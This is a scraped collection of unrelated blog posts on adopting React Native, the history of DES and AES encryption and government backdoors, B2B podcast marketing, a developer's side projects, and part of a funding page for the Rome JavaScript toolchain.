<p>I can imagine recruiting top-notch mobile development specialists is easier if you’re a huge company with infinite resources. In that case, you could staff the necessary amount of specialist teams for iOS and Android and just steamroll whatever you’re making.&nbsp;</p>
<p>In the Norwegian market, with finite resources, easing your requirements from <em>«five years of Swift»</em> to <em>«five years of JavaScript experience»</em> makes all the difference. The programming language in itself is one thing, but there’s also the ecosystem, development enviroment, IDE, etc. Apple make a lot of really sweet products, but XCode surely isn’t one of them.</p>
<h2>Team Organization</h2>
<p>Our old codebase was.. entangled. I imagine it would be challenging to attempt doing distributed development on the same codebase across several teams. At least when aiming for near-continuous delivery. Doing a Spotify-like product team organization with an app dev in each team seemed utopian at the time.</p>
<p>Over the course of a few years, we went from a dedicated mobile team of five to a product team organization with near 20 mobile developer spread across all teams. This would be much harder without the flexibility and familiarity of <em>«it’s just JavaScript»</em> or <em>«it´s just React»</em>. Not having to invest as much time and energy in specialist competencies for iOS or Android, app devs have more cognitive surplus to work on other things as well - web, cloud stuff, backend, UX-collaboration, etc.</p>
<h2>Deploy To Production At Will</h2>
<p>Mobile apps have always had a longer way to production. The <em>«quality control»</em> mechanism with manual app reviews adds several days to the pipeline. The Apple App Store was alone responsible for up to a 14-day delay at it’s worst, although the wait times have been vastly reduced since then. Now they’re averaging at about a day.</p>
<p>A good dev team in 2020 will deploy to production many times each day. Looking at some of the biggest Norwegian apps today, it is not uncommon to see two-three-four week old builds as the most recent one.&nbsp;</p>
<p>The negative effects of not releasing your code often, and not even having the possibility to release at will, are well documented. React Native with it’s <em>over the air</em>-update called <em>CodePush</em> allows for continous delivery, even for mobile apps!&nbsp;</p>
<p>CodePush allows your app code to download the latest version of the compressed JavaScript bundle from a third-party server. When a user opens the app, the new bundle is downloaded and immediately installed. Voilà – immediate deploy to production!</p>
<p>Our app’s release cycle went from semi-monthly to several releases per day. Paired with great monitoring, this reduces the need for testing. Non-critical bugs can be tolerated to a larger degree if they don’t reach your entire audience before they’re automatically detected and shortly fixed.&nbsp;</p>
<p>Product development is also way faster. The team can iterate on small changes on real customers in production as a part of the development process, instead of lengthy sketching and laboratory user testing. This made the entire organization more customer-focused and impatient for real customer feedback.</p>
<h2>A Note On The Rewrite</h2>
<p>The whole codebase transformation to React Native took about two years. We only wrote already-planned new features in React Native, allowing us to be productive and produce new features during the process. The business transformation underway meant that most of the features would have required changes anyway, and it could actually be faster to implement them from scratch in React Native than to modify the legacy code.&nbsp;</p>
<p>This meant that we didn’t need a feature-freeze period with the team stuck on unproductive rewrite work. However, when most of the old app was rewritten, we needed a month-long cleanup to move all the separate features in the old app over to a new, fresh React Native repo.&nbsp;</p>
<p>From around March 2017 until June 2019 the app was in a state where some features existed in the old codebase and others in the new codebase. That wasn’t a pleasant situation, but not more unpleasant than working in the old legacy codebase before.</p>
<h2>Status As We’re Looming On 2021</h2>
<p>A total of <strong>10,000 commits</strong> have been made by <strong>33 contributors</strong> across <strong>5 teams.</strong>. Nearly 50 pull-requests from 14 authors was merged the past week. Our ability to deliver on business requirements have been strengthened. Looking back on our big choice of 2017, it’s truly awe-inspiring to see how big an effect a simple technology choice can have on helping teams reach lofty goals.</p>
<p>No technology is a silver bullet. React Native surely isn’t either. But it does have some truly wonderful effects on an impatient, agile, modern development organization that Swift, Kotlin or C# currently can’t offer, in my opinion.</p></section></article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Cryptography is the science of secret writing with the goal of hiding the meaning of a message. When a message is encrypted with a secure algorithm, i.e. an encryption cipher, no one should be able to read it without the decryption key. However, the promise of security falls apart if the encryption algorithm is weak, or if someone has created a backdoor. In this article we’ll examine the modern history of encryption. We’ll learn that while the mathematical underpinnings of modern encryption is stronger than ever, government agencies have a history of thwarting efforts to reach the goal of truly secure communication. </p>
</section><article><section><p>The world’s first encryption ciphers often used algorithms that were themselves secret. The rather intuitive belief that security increases if the encryption details are hidden is a misconception, and is often referred to as <em>security by obscurity</em>. The algorithms that dominate the modern era rely on full openness, in accordance with <em>Kerckhoffs's principle</em>:</p>
<blockquote>
<p>A cryptosystem should be secure even if everything about the system, except the key, is public knowledge.</p>
</blockquote>
<p>This transparency allows the rest of the world to attempt to break the cipher. Every failed attempt at breaking a cipher reinforces the belief that it is secure. While there is a chance that someone breaks a cipher and does not report it, there is a far greater chance that a homemade algorithm will be broken easily.</p>
<h2>A big moment in cryptographic history</h2>
<p>Up until 1972 there was no standard cipher for encrypting secret messages. The US <em>National Bureau of Standards (NBS)</em>, which later became the <em>National Institute for Standards and Technology (NIST)</em>, started an initiative for finding a single secure algorithm. This was rather revolutionary. The American government had traditionally kept their knowledge of cryptography to themselves - they considered it to be crucial to national security. As a result of the NIST initiative, several ciphers were proposed as candidates for the first encryption standard.</p>
<p>The most promising candidate was contributed by a team of cryptographers working at IBM. They developed a refined version of an earlier encryption cipher called Lucifer, which was first developed by Horst Feistel in the late 1960s. Their candidate was a block cipher with a key size of 128 bits. A block cipher is an algorithm that encrypts several bits at a time, i.e. a block of bits, as opposed to stream ciphers that encrypts bit by bit. A sufficiently large key size is necessary for a cipher to withstand brute force attacks, since these attacks generate all possible decryption keys. In context of a brute force attack, one would say that the larger the key size the more robust the cipher.</p>
<h2>Speculation of NSA backdoors</h2>
<p>When the NIST examined the security of the cipher candidates, they reached out to the <em>National Security Agency (NSA)</em> for assistance. At this point in time the NSA did not even admit their own existence. The involvement of the NSA lead to speculation and rumors, since the cipher went through a couple of peculiar alterations during the cooperation between NSA and IBM. </p>
<p>The most worrying change was that the key size was reduced from 128 bits to 56 bits. This made the cipher considerably less resistant to brute force attacks. Concerns were raised that this change was motivated by the NSA, in order to provide themselves with a backdoor. Maybe their computers were powerful enough to brute force a key size of 56 bits – but not quite powerful enough to brute force a key size of 128 bits? </p>
<p>The cipher was also altered to be resistant to attacks using differential cryptanalysis. That doesn’t sound too bad, but this particular attack was not known to the public until 1990 – almost 20 years later! If the NSA were familiar with an attack the world would need 20 more years to discover, it is not hard to believe that they might be able to brute force a 56 bit key. However, it should be noted that none of these claims have been proven. </p>
<p>In 1977, the NIST presented an altered version of the IBM cipher as the new standard, which they named the <em>Data Encryption Standard (DES)</em>. It became the first modern, public, freely available encryption algorithm. All details regarding DES were made public, which is good practice since it allows researchers to scrutinize the mathematical details. However, the motivation for the design criteria remained secret. The public never learned why the key size was reduced, and this was the main cause for suspicion regarding the involvement of the NSA.</p>
<h2>DES cracked through brute force attack</h2>
<p>DES was initially meant to be the standard cipher for encryption for 10 years; from 1977 to 1987. But no serious weakness was found, and DES went on to reign as the standard algorithm for more than a decade past its due; until 1999.
In the final years of DES, several attempts were made to design and build a machine to brute force it. Building such a machine would cost millions of dollars. It was speculated that only government agencies would have the necessary financial resources to build it, and by this time it was widely believed that the NSA could in fact crack DES.</p>
<p>As the price of hardware fell, the <em>Electronic Frontier Foundation (EFF)</em> built the machine
<a href="https://en.wikipedia.org/wiki/EFF_DES_cracker">Deep Crack</a>.
In 1998 Deep Crack was able to brute force DES in 56 hours. This event demonstrated that it was time to select a new standard cipher for encryption.</p>
<p>In 1997, the NIST initiated an open competition to find a new standard encryption cipher. The competition had five finalists:
<a href="https://www.cs.miami.edu/home/burt/learning/Csc688.012/rijndael/rijndael_doc_V2.pdf">Rijndael</a>,
<a href="http://cryptosoft.de/docs/Mars.pdf">Mars</a>,
<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.2.1151&amp;rep=rep1&amp;type=pdf">RC6</a>,
<a href="http://www.networkdls.com/Articles/serpent.pdf">Serpent</a> and
<a href="http://gazizova.net/pub/Library/ihtik_Library/dvd_(%D0%A0%D0%B0%D0%B4%D0%B8%D0%BE)%D0%AD%D0%BB%D0%B5%D0%BA%D1%82%D1%80%D0%BE%D1%82%D0%B5%D1%85%D0%BD%D0%B8%D0%BA%D0%B0/rea_2/Schneider%20B.Twofish.A%20128-bit%20block%20cipher.1998.pdf">Twofish</a>.
This time the selection process was completely transparent. In 2001, after three competitive rounds and intense cryptanalysis by the world’s foremost experts, the decision was made. The cipher Rijndael, designed by the Belgian cryptographers Joan Daemen and Vincent Rijmen, was declared as the new standard. It was given the name <em>Advanced Encryption Standard (AES)</em>. This cipher has three possible key sizes: 128 bit, 192 bit and 256 bit. All these key sizes were sufficiently large to withstand brute force attacks.</p>
<p>AES is widely regarded as the most secure encryption cipher invented. It has been battle-tested for decades and is expected to remain the standard cipher for many years to come. So far there are neither any known critical weaknesses, nor suspicion of backdoors.</p>
<h2>Attempts at legalizing government backdoors</h2>
<p>Algorithms have matured to be practically unbreakable, but current legislative measures attempt to undermine the basic purpose of cryptography. There are recurrent proposals for allowing government backdoors. For instance, the recently proposed <a href="https://www.judiciary.senate.gov/press/rep/releases/graham-cotton-blackburn-introduce-balanced-solution-to-bolster-national-security-end-use-of-warrant-proof-encryption-that-shields-criminal-activity"><em>Lawful Access to Encrypted Data Act</em></a> aims to force technology companies to implement backdoors. The right to privacy ends when the government institutions deem it useful to their own agenda. If such a law were to pass, the consequences would be immediate and severe. It would grant immense power to the government, and if a key is leaked or stolen, all encrypted communications are out in the open. Lawmakers argue that having a backdoor would help fight crime and terrorism, but this view assumes that criminals play by the rules and communicate through services using government issued encryption. </p>
<p>In the modern era the goal of private digital communication is, from a technological standpoint, a solved problem. It remains to see if future citizens will be able to enjoy digital privacy in their lives. It’s a question of balancing power between the government and the people – and problems of that nature are not solved as elegantly as cryptographic puzzles.</p>
<p><em>If you want to go further down the rabbit hole, I highly recommend listening to the following episode of the Darknet Diaries podcast: <a href="https://darknetdiaries.com/episode/12/">Episode 12 - Crypto Wars</a>.</em></p></section></article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><em>Is it possible to use podcasts for b2b marketing?</em></p><p>Is a question I have heard approximately 23 times since we started Fame.</p><p>The growth of our agency has proven the answer to this question to be: a resounding yes.</p><p>The next question they ask is... how?</p><p>This is the post I then link to these people...</p><p>Below I share what we see to be the seven core benefits of starting and growing a B2B podcast for your business.</p><p>Before we jump in, if you're not 100% sure what we mean by the team "podcast marketing" then we suggest you quickly check out this post on the <a href="https://www.bcast.fm/blog/what-is-podcast-marketing" target="_blank">what, why and how of podcast marketing</a>.</p><h2>1. Form Profitable Partnerships</h2><p>Most of what we do as B2B marketers follows this process:</p><ol role="list"><li>Work out who we want to sell to</li><li>Get the attention of these people</li><li>Try to sell to them</li></ol><p>If we improve at each of these steps over time, then we should ideally be able to close sales.</p><p>Step 2 can often be the most expensive step, as driving targeted traffic from Linkedin gets more expensive by the day.</p><p>A little known method for executing Step 2 really well, is to simply make friends with people or business that already have the trust of your perfect audience, and then get them to promote you... they do this for one fo the following reasons:</p><ul role="list"><li>Out of the goodness of their heart</li><li>Because you will promote them back</li><li>Because you pay them upfront</li><li>Because you offer them a percentage of any sales made</li></ul><p>Now, if you can somehow get these people to like you before pitching them on any of the above reasons for promoting you, you will increase the likelihood of the first reason, and will get a better deal on any of the others.</p><p>And the best way to get them to like you is to create content together, and expose them to your audience FIRST... through your podcast.</p><p>As an example, multiple partnership agreements have been formed between the host and the guests of the Sales Ops Demystified podcast:</p><figure id="w-node-e6a5c2299804-86dd1663"><a href="https://podcasts.bcast.fm/sales-ops-demystified" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fcdeeb3f750a002bb1415f2_Sales_Ops_Demystified.jpg" loading="lazy" alt=""></p></a><figcaption><em>If guests work in the same niche as the host, partnerships can be formed.</em></figcaption></figure><h2>2. Get Feedback From Experts</h2><p>Would your product or service be better if you were able to receive feedback from one proven expert in your niche per month for twelve months straight?</p><p>I think the resounding answer would be: <strong>yes</strong>.</p><p>So the question then becomes... how can we incentivise these experts to add value to your business?</p><p>The answer to this question is resoundingly simple: you add value to their business first.</p><p>You see, when you invest in building a niche audience, the audience itself is an asset. The audience like and trust you, and will therefore reward you with their attention.</p><p>When you bring a guest onto your show, and expose them to your audience, you are adding value to their business.</p><p>Numbers 1, 2 and 7 on this list all centre around building strategic relationships with people in your niche.</p><p>A podcast is hands down the most effective and time efficient way of doing this.</p><p>One example of this is when Sujan Patel joined the Confessions Of A B2B Marketer podcast to be interviewed about his expertise, post interview he said he would love to have another call to give feedback on our growth...</p><p>Two weeks later we jumped on another call, recorded it for another podcast episode:</p><figure id="w-node-f5ac55325769-86dd1663"><a href="https://saasmarketer.io/ep-015-sujan-patel-shares-4-saas-growth-strategies-for-bcast/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fcdea1b882431471c817b97_Ep_015_-_Sujan_Patel_Shares_4_SaaS_Growth_Strategies_For_bCast.jpg" loading="lazy" alt=""></p></a><figcaption><em>Sujan giving us free advice on how to grow bCast</em></figcaption></figure><p>I think Sujan typically would charge $000's per hour for this kind of advice...</p><h2>3. Generate Linkedin Engagement From Content</h2><p>The way you get social networks to send you traffic is to first give them what they want.</p><p>This is actually a deeper life lesson but I will elaborate on that in another blog post, post retirement.</p><p><em>What do social networks want?</em></p><p>Ultimately, it's our attention that they're after.</p><p>They want every human eye glued to the phone or laptop, every second of every day. Because this is how they make money.</p><p>So if you want more traffic for your business, you need to first give Linkedin what they want: attention.</p><p>You give Linkedin attention by providing people information that either:</p><ul role="list"><li>Informs them</li><li>Inspires them</li><li>Educates them</li></ul><p>And a podcast is an awesome way to do this.</p><p>You simply pull out the big insight from an episode then post it to Linkedin in written, image or video form.</p><p>Over time, you will learn the type of content that your target audience enjoys... then you can do more of that.</p><p>Here is an example of this:</p><figure id="w-node-59d45d622ac0-86dd1663"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fcde7e1be636192578214ac__99___Post___LinkedIn.jpg" loading="lazy" alt=""></p><figcaption><em>Linkedin rewarding Patrick for posting engaging content...</em></figcaption></figure><h2>4. Generate Linkedin Engagement From Shares</h2><p>There is an unwritten rule in the podcasting world.</p><p>If you guest on a show, you share the show.</p><p>It proves to be true 75% of the time.</p><p>So when you are selecting guests, you need to take this into account...</p><p><em>Who in your niche would be the best person to share your content? E.g. who has the biggest and most engaged audience of your target customers on Linkedin?</em></p><p>Here is an example of the guest of a podcast, sharing the episode and therefore inherently endorsing the host of the podcast with this share:</p><figure id="w-node-2d89a6a44789-86dd1663"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fcdeb0ff20459075e12bddc_Shrawan_Patel__MD___LinkedIn.jpg" loading="lazy" alt=""></p><figcaption><em>Guests giving traffic and authority to the host...</em></figcaption></figure><p>Any trust that the connections of this guest have in the guest, is transferred to the host, generating social followers, traffic and ideally: leads and then sales.</p><h2>5. Rank For Long Tail Keywords</h2><p>The "hub and spoke" model is a tried and tested SEO strategy.</p><p>The basic premise is that you choose a main keyword and optimise a page on your website for this keyword. You then select sub-keywords of this main keyword and then write blog posts on the topic. These blog posts then all link back to your main keyword page.</p><p>Podcast episode blog posts make GREAT sub-keyword blog posts:</p><ul role="list"><li>They contain, original engaging content</li><li>The guest will drive traffic (see above)</li><li>The guest will provide a link back (see below)</li></ul><p>To do this, you either retrofit a keyword to the content, or decide upon which keyword you want to tackle before recording.</p><p>If your release one episode per week for a year, you will generate 52 high engaging sub-keyword blog posts related to your niche... which should have already started to generate some solid inbound traffic.</p><p>Here is an example of <a href="https://saasmarketer.io/saas-marketing-playbook/" target="_blank">an episode</a> of the Confessions Of A B2B Marketer podcast rising to the top of the rankings for a long tail keyword related to their niche:</p><figure id="w-node-29c5eb31232d-86dd1663"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fcde5f8a80b9678140893de_Overview_%E2%80%94_SaaS_Marketer.jpg" loading="lazy" alt=""></p><figcaption><em>An episode keyword rising in the rankings...</em></figcaption></figure><h2>6. Get Backlinks</h2><p>Every marketing team is looking for real, genuine backlinks.</p><p>Real genuine backlinks lead to real, genuine organic hits on your site.</p><p><em>So how does podcast marketing deliver this?</em></p><p>If you do a great job of creating written, audio and even video content that makes your podcast guest look great, then they are going to want to show it off to their friends, family and future employers.</p><p>They are going to want to link.</p><p>We see approximately one in five podcasts guests link back to their hosts... how do you get them to do this?</p><p>A certain number of guests will do this naturally, for the rest: you just ask. It really is that simple.</p><p>Here's an example of a guest that we didn't have to ask to link:</p><figure id="w-node-06ea1a0afd61-86dd1663"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fcddf474adcebc05a322440_Andrew_Etter.jpg" loading="lazy" alt=""></p><figcaption><em>Free backlinks</em></figcaption></figure><p>Andrew Etter was a guest on a client podcast, the day after his episode launched... he adds the backlink back to episode page on the <a href="https://document360.io/blog/the-benefits-of-open-sourcing-content-with-andrew-etter-of-amazon-web-services/" target="_blank">host's website</a>.</p><h2>7. Close Deals With Guests</h2><p>And this is the big one.</p><p>This is the one that... if you're a founder, will grow your business and if you're a marketing manager, will get you promoted.</p><p>If you are strategic about the guests you bring onto your podcast and you have a good product, at some point you will make sales.</p><p>The podcasting process is an emotional experience for a guest.</p><ul role="list"><li>First they are honoured</li><li>Then they get nervous</li><li>Then they are received</li></ul><p>If your podcast host and team are reliable, enthusiastic and engaging during this process, they will form a bond with the guest personally, and a sense of goodwill from the guest to the business. </p><p>Once this is done, all that is left to do is to then simply move down the guest down and then ideally through... the sales process.</p><p>Here is an example where the business didn't even need to ask the guest about discussing their product:</p><figure id="w-node-5a95c6cf71ee-86dd1663"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fcdde554e5b8de9976faf51_lomit_linkedin_request1.jpg" loading="lazy" alt=""></p><figcaption><em>From guest to lead...</em></figcaption></figure><p>And there we go...</p><p>Thanks for enquiring about whether podcasts can work for B2B marketing, and now you have all the information you need to make your own decision.</p><p>And if you do start one, please email us at <a href="mailto:team@fame.so">team@fame.so</a> when you launch... we will subscribe, rate and review!

<h2>Making the most of my downtime working on side projects</h2>



<p>I may have mentioned in a <a href="https://www.philliphughes.co.uk/general/diy-and-gardening-since-when-have-i-become-so-middle-aged/" target="_blank" rel="noreferrer noopener">previous blog post</a>, I’ve been put on reduced hours. I’m down to a 3 day week. It’s not all bad. Apart from all the extra time to work on our house and be out in the gardens. I’ve been able to work on my side hustle and business ideas.</p>



<p>I’ve got quite a few “irons in the coals” as it were. It seems people are more open to discussing the ideas and giving feedback.</p>



<p>Once of my projects has been on the go for at least two years now. After spending month and months last year trying to find people to give me some input on the idea. Last week I finally&nbsp;got it in front of a couple of potential customers. Using&nbsp;<a href="http://zoom.us/" target="_blank" rel="noreferrer noopener">Zoom</a>&nbsp;to demo the product and they loved it.</p>



<p>After chatting in a Facebook group. A few weeks ago I&nbsp;came up with an idea for a fishing based mobile app.&nbsp;<a href="https://baitcamp.net/" target="_blank" rel="noreferrer noopener">I quickly got a website together</a>&nbsp;and asked few people to give it a once over. Then, got a small Google ads campaign going and found around 30 potential customers in just a few days.&nbsp;</p>



<p>I’ve started building out the app design and used <a href="https://outflash.xyz/" target="_blank" rel="noreferrer noopener">Outflash</a> to send out updates on the design to get further feedback from the people that are interested.</p>



<p><a href="https://outflash.xyz/" target="_blank" rel="noreferrer noopener">Outflash</a> is my main side hustle. It’s nearly 12 months since I came up with the idea. Looking back it’s been a bit of a whirlwind and I have learnt a lot.</p>



<p>The down time is giving me more time to focus on Outflash and plan things a bit better. I hoping to be more structured when working and promoting the email enhancement&nbsp;add-in. Let’s hope I can stick to it.</p>



<p>What sorts of projects have you been working on over the last 6 weeks?</p>



<p>Thanks</p>



<p>Phil</p>

<![CDATA[Starting a Side Hustle, the Frustrations, Trials and Tribulations (Part 2)]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>It’s been a while since I have blogged about <a href="https://www.philliphughes.co.uk/general/starting-a-side-hustle-the-frustrations-trials-and-tribulations-part-1/" target="_blank" rel="noreferrer noopener" aria-label="starting a side hustle (opens in a new tab)">starting a side hustle</a>. I’ve been terrible at writing new posts about my trials and tribulations. I promised that I would post regular updates (8 months isn’t regular). </p>



<p>So, without further ado. Here is what I have been up to, and what frustrations, trials and tribulations I have been going through with my side hustles.</p>



<p>My main focus has been on two software products (SaaS). One of them is called <a rel="noreferrer noopener" aria-label="Elementary Analytics (opens in a new tab)" href="https://www.philliphughes.co.uk/general/starting-a-side-hustle-the-frustrations-trials-and-tribulations-part-2/://elementaryanalytics.com" target="_blank">Elementary Analytics</a>, which I have been working on for well over 18 months now. </p>



<p>The second product is an idea I came up with shortly after my last post. After listening to a podcast about a Gmail plugin. I thought I could come up with something similar for Outlook.com. So in October 2019,  after 4 months of graft I manage to launch <a rel="noreferrer noopener" aria-label="Outflash (opens in a new tab)" href="https://outflash.xyz/" target="_blank">Outflash</a>.</p>



<h3>Becoming Good At Juggling</h3>



<p>Trying to launch two software products alongside each other is a bit of juggling act. I’m also trying to do things differently, or start trying things I haven’t done before. This mantra has come from the following two sayings: </p>



<p>“If you want different results from what you have had before. You need to do things differently”</p>



<p>“The definition of madness is doing the same thing over and over again and expecting different results”.</p>



<p>I’ve tried to keep these sayings in the front of my mind. Forcing myself to try different things. Hopefully to discover something that’s working.</p>



<p>What has that looked like recently? Well, I have taken a few online courses relating to software marketing. I have also registered for a few MeetUp groups and attended a marketing based meet up at the start of 2020.</p>



<p>My focus has changed slightly. I’m trying to do a 50/50 split of 50% product development and 50% marketing efforts. However, I’m still a complete newbie at marketing. Finding it a real challenge to “move the needle”.</p>



<p>Unlike the last few blogs about <a rel="noreferrer noopener" aria-label="working on my side hustles (opens in a new tab)" href="https://www.philliphughes.co.uk/general/what-i-learned-from-failed-side-hustles/" target="_blank">working on side hustles</a>. I’m going to start with a few positives.</p>



<h4>Positives</h4>



<p>1)  If I have had an idea that I think could become a business in the future. Instead of diving straight in and building something. I have been creating landing pages to validate the idea and to building an email list of potential users/customers first. This helped my decide to work on <a rel="noreferrer noopener" aria-label="Outflash  (opens in a new tab)" href="https://outflash.xyz/" target="_blank">Outflash</a> instead of another idea.</p>



<p>2) I started working on <a rel="noreferrer noopener" href="https://outflash.xyz/" target="_blank">Outflash</a> at the end of July 2019. By October of the same year I had launched the product. Built a marketing website. Created various social media accounts to try and promote the product. At the time of writing this post, I had just over 20 installs of the free version of the Outlook plugin. From idea to launch took less than 6 months, very happy with that turnaround.</p>



<p>3) I managed to get the reporting suite built in <a rel="noreferrer noopener" aria-label="Elementary Analytics (opens in a new tab)" href="https://elementaryanalytics.com/" target="_blank">Elementary Analytics</a>. The product is now in MVP, with only a few small tweaks that need to be completed. The marketing site has been reworked as well (using <a rel="noreferrer noopener" aria-label="Basecamp's (opens in a new tab)" href="https://basecamp.com/" target="_blank">Basecamp’s</a> marketing site as my guide). Amazingly someone registered for the service in January 2020, without me doing any additional marketing work. I’ve also been able to get feedback from a few potential users, helping me come up with a direction for the product, which was one of the major stumbling blocks I had.</p>



<p>4) Another idea that a friend suggested I do, is a sister website to <a rel="noreferrer noopener" aria-label="footballsocial.club (opens in a new tab)" href="https://www.footballsocial.club/" target="_blank">footballsocial.club</a> called <a rel="noreferrer noopener" aria-label="cricketsocial.club (opens in a new tab)" href="https://cricketsocial.club/" target="_blank">cricketsocial.club</a>. I managed to get this site setup in a few days. I have been reaching out to people on Facebook who are members of existing Cricket based groups to see if they would be interested in trying the site. So far I have had one or two sign-ups. Not bad for a weekend’s worth of work.</p>



<h4>Frustrations</h4>



<p>1) Still haven’t been able to find my first paying customer. Instead of hearing the sounds of a till register, I’m hearing crickets. I’m trying to show some patience, mainly I’ve extremely frustrated.</p>



<p>2) Running ad campaigns on LinkedIn, Facebook, Reddit, Quora and Pinterest all seem to have struck a blank. Although I think a Bing Ad campaign has helped me get a few installs for Outflash.</p>



<p>3) I’m finding that marketing is a very slow process and isn’t a rewarding straight away. You aren’t always sure what you are doing will work. Starting from zero is also difficult as very few people will see your marketing efforts. </p>



<p>4) Writing blog posts, creating YouTube videos, finding relevant content to share on social media, coming up with my own social media campaigns is an effort in itself. I could easily 60+ hours a week on this.</p>



<p>5) Doesn’t feel I am any closer to being able to make the switch from employee to owner. </p>



<h4>Trials</h4>



<p>1) I have setup a YouTube channel for Elementary Analytics, which I’m hoping to create a series of “How To” videos. Showing people what Elementary Analytics is, how to use the service and how it can benefit them. This  idea come from “Do something you haven’t done before”.</p>



<p>2) As mentioned, working on these side projects is a bit of a juggling act. Trying to spend 50% of my time programming and 50% on marketing effort can be a challenging. What I have decided to do is do one week on development work. The next week focus solely on marketing. I was trying to do it on a day to day basis, but found I wasn’t focusing enough and if I had some left over tasks from the previous day. It impacted productivity the day after.</p>



<p>3) Instead of trying to do all this complex marketing, sales funnels, etc. I’m planning trying to contact potential customers directly. I’ve been able to move the needle slightly with Outflash. However, Elementary Analytics has been a different kettle of fish. My plan is to email potential customers to see if Elementary Analytics would be of use to them. If I get any feedback I can use the info to hopefully make informed decisions to move forward.</p>



<h4>Tribulations</h4>



<p>1) Still feels like I am getting nowhere fast. People say it’s good as you are “finding what doesn’t work”. This isn’t giving me any solace. It’s just adding to my overall “pissed off mood”. </p>



<p>2) My list of things to get done doesn’t seem to be getting any smaller. Even though I am getting through a fair bit of work each week, the list in my Trello board seems to be never ending.</p>



<p>3) Still tweaking and playing around with the products. “If I just implement this” or, “If I redo this, then…”. I will be stopping this very soon, Outflash is nearly at a point were it is a product I am happy with. Elementary Analytics shouldn’t be to far behind either.</p>



<p>There you have it. This is part two of my “regular” rant about starting a side hustle.</p>



<p>I’m hoping over the coming weeks and months that these posts will become more and more positive. Things have been a lot better of the last couple of months. Not were I want things to be, to quote The Rolling Stones “You can’t always get what you want”.</p>



<p>Thanks for reading part two of starting a side hustle. Would like to hear your thoughts. Phil</p>

These tools have both inspired me to create Rome, a new project that aims to simplify and improve JavaScript and web development.</p> <p>Rome consolidates dozens of separate tools into one. Rome can install your dependencies, check your code for errors, run your tests, bundle your code, and more, all via a single CLI. Rome will be able to replace Babel, ESLint, Prettier, Yarn, and webpack. <a href="https://rome.tools/">Learn more</a>.</p> <p>It’s been three months since we announced our initial <a href="https://rome.tools/blog/2020/08/08/introducing-rome.html">beta release</a>. Since then, we’ve received a tremendous amount of enthusiasm from the community. As that enthusiasm has grown, it’s become clear that Rome will require a full-time developer to be successful and deliver on our ambitious goals and release a stable v1.0.</p> <p><strong>I need your help to make it a reality.</strong></p> </section> <section> <h2 id="funding">Funding <a href="#funding" aria-label="funding"></a></h2> <p>I have left my job so I can work independently and focus on what the community needs. This includes a <a href="#allow-users-to-extend-functionality-with-plugins">plugin system</a>, <a href="#add-more-configuration-and-have-less-opinions">more configuration</a>, and <a href="#integrate-with-existing-tools">dedicated integrations for existing tools</a>.</p> <p>We have an initial goal of <strong>$100,000</strong>. This will allow myself to work independently on our first stable release. Additional funding would allow us to expand upon our release goals, fund future maintenance, and compensate other contributors.</p> <p>If you’re passionate about what we’re building, or have otherwise benefited from my work, I would appreciate your financial support.</p>    <section> <h3 id="recent-contributions">Recent Contributions <a href="#recent-contributions" aria-label="recent-contributions"></a></h3> <ul> <li>Loading...</li> </ul> </section> <section> <h3 id="contribute">Contribute <a href="#contribute" aria-label="contribute"></a></h3> <p>Prices are in USD.

I’ll make sure Rome works well for you and your organization.</p> <p>Migration support is where I personally help your organization adopt and use Rome. This could include porting configuration, integrating with CI, or even adding new features and configuration to Rome.</p> <p>Interested in something else or have questions? Get in touch at <a href="https://rome.tools/cdn-cgi/l/email-protection#166573747765627f77785664797b73386279797a65"><span data-cfemail="641701060517100d050a24160b09014a100b0b0817">[email&nbsp;protected]</span></a>!</p> <p> Loading... </p> </section> </section> </section> <section> <h2 id="goals">Goals <a href="#goals" aria-label="goals"></a></h2> <p>Funding will allow us to focus on usage and labor-intensive goals. We can make Rome easier to use and work for more people.</p> <section> <h3 id="add-more-configuration-and-have-less-opinions">Add more configuration and have less opinions <a href="#add-more-configuration-and-have-less-opinions" aria-label="add-more-configuration-and-have-less-opinions"></a></h3> <p>We have deliberately tried to keep configuration to a minimum. While this does produce a minimal API surface, it makes it almost impossible to easily migrate without losing functionality or changing conventions.</p> <p>We should aim to reduce the functional differences between Rome and other tools by introducing additional configuration and supported languages. This could include:</p> <ul> <li>Code formatting options</li> <li>Ability to customize expected filenames and directories</li> <li>Support for other configuration languages such as YAML and TOML</li> <li>More CLI flags</li> <li>Public JavaScript API</li> <li>Dynamic configuration (as opposed to static JSON-only configuration files)</li> <li><a href="#allow-users-to-extend-functionality-with-plugins">Allow extending functionality with plugins</a></li> </ul> <p>We have so far kept configuration light, as by reducing the amount of configuration options supported, we reduce maintenance cost and the potential for internal bugs.</p> <p>While this makes it easier for us as maintainers, it makes it drastically more difficult for users. No matter how persuasive our arguments may be for why you should use hard tabs instead of spaces, they seem like artificial and arbitrary constraints and introduces excessive prerequisites for adoption.</p> <p>Strong defaults and guided documentation for new users can provide the experience we ultimately want to offer, while removing our existing adoption restrictions.</p> </section> <section> <h3 id="integrate-with-existing-tools">Integrate with existing tools <a href="#integrate-with-existing-tools" aria-label="integrate-with-existing-tools"></a></h3> <p>Rome attempts to replace many tools. However we should still strive to support scenarios where another tool is better situated or preferred. This can also help during a migration where Rome is used in conjunction with another tool. We can do this in a couple of ways:</p> <p><strong>Integrating Rome as a first-class plugin in tools such as Babel, eslint, and webpack</strong></p> <p>Rome could be exposed as a plugin for those tools to allow you to adopt the Rome compiler without having to adopt the bundler first. This would reduce adoption prerequisites and allow easier experimentation inside of existing setups.</p> <p><strong>Seamlessly integrate other tools into Rome</strong></p> <p>We can introduce compatibility layers to have ESLint, Babel, and other tools run inside of Rome itself. ESLint errors could be displayed alongside Rome linter errors with the same UI and output format Instantly you could benefit from Rome’s file caching and parallelisation without needing a major migration.</p> </section> <section> <h3 